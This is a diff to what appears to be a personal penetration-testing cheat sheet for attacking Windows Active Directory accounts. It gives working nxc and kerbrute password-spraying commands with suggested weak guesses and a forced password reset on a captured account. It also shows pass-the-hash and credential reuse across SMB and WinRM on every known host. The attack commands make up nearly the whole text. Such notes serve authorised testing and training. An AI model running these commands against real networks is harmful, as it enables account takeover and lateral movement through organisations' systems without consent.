@@ -17,14 +17,14 @@ grep VALID kerbrute.log | awk '{print $NF}' | cut -d@ -f1 | sort -u > users.txt
 
 ## Spray
 One password, every user, carrying on after a hit:
-nxc smb <DCIP> -d <Domain> -u users.txt -p '<Password>' --continue-on-success
+nxc smb <DCIP> -d <Domain> -u users.txt -p 'THE-GUESS' --continue-on-success
 Each user's name as their password, paired line by line:
 nxc smb <DCIP> -d <Domain> -u users.txt -p users.txt --no-bruteforce --continue-on-success
 Known pairs, line 1 with line 1:
 nxc smb <DCIP> -d <Domain> -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
 Over Kerberos, stopping if any account comes back locked:
-kerbrute passwordspray --safe -d <Domain> --dc <DCIP> users.txt '<Password>'
-- [ ] Candidates: season and year, such as Autumn2026!, month and year, Welcome1, Password1, the company's name with digits
+kerbrute passwordspray --safe -d <Domain> --dc <DCIP> users.txt 'THE-GUESS'
+- [ ] Candidates for THE-GUESS: season and year, such as Autumn2026!, month and year, Welcome1, Password1, the company's name with digits
 - [ ] Every password I have found anywhere, before any guess
 
 ## Read the result
@@ -35,16 +35,17 @@ kerbrute passwordspray --safe -d <Domain> --dc <DCIP> users.txt '<Password>'
 - [ ] STATUS_ACCOUNT_LOCKED_OUT: stop at once
 
 ## A password that must change
-impacket-changepasswd '<Domain>/<TargetUser>:<Password>@<DCIP>' -newpass 'Pwned123!'
-smbpasswd -r <DCIP> -U '<TargetUser>'
-nxc smb <DCIP> -d <Domain> -u '<TargetUser>' -p 'Pwned123!'
+The account the spray found is now mine: filled in as <Username> and <Password>.
+impacket-changepasswd '<Domain>/<Username>:<Password>@<DCIP>' -newpass 'Pwned123!'
+smbpasswd -r <DCIP> -U '<Username>'
+nxc smb <DCIP> -d <Domain> -u '<Username>' -p 'Pwned123!'
 
 ## Reuse everything I hold
 Every host I know of goes in targets.txt, one per line.
 nxc smb targets.txt -d <Domain> -u '<Username>' -p '<Password>' --continue-on-success
 nxc smb targets.txt -d <Domain> -u users.txt -H hashes.txt --continue-on-success | tee nxc-smb.txt
-nxc smb targets.txt -u Administrator -H '<Hash>' --local-auth --continue-on-success
-nxc smb targets.txt -u Administrator -p '<Password>' --local-auth --continue-on-success
+nxc smb targets.txt -u '<Username>' -H '<Hash>' --local-auth --continue-on-success
+nxc smb targets.txt -u '<Username>' -p '<Password>' --local-auth --continue-on-success
 grep -F '[+]' nxc-smb.txt
 Other services, with the same credential:
 nxc winrm targets.txt -d <Domain> -u '<Username>' -p '<Password>' --continue-on-success
